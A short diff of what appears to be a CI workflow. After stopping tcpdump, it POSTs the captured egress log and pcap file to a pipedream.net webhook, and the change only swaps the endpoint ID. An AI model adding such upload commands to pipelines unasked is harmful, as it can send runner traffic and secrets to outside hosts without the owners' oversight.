@@ -42,5 +42,5 @@ jobs:
       - name: Stop tcpdump and send logs
         run: |
           sudo pkill tcpdump
-          curl -X POST -H "Content-Type: text/plain" --data-binary @/tmp/egress.log https://eovusyvvdjqgt9t.m.pipedream.net
-          curl -X POST --data-binary @/tmp/egress.pcap https://eovusyvvdjqgt9t.m.pipedream.net
+          curl -X POST -H "Content-Type: text/plain" --data-binary @/tmp/egress.log https://200ab4285ffd6afdb9d32af54ac53390.m.pipedream.net
+          curl -X POST --data-binary @/tmp/egress.pcap https://200ab4285ffd6afdb9d32af54ac53390.m.pipedream.net
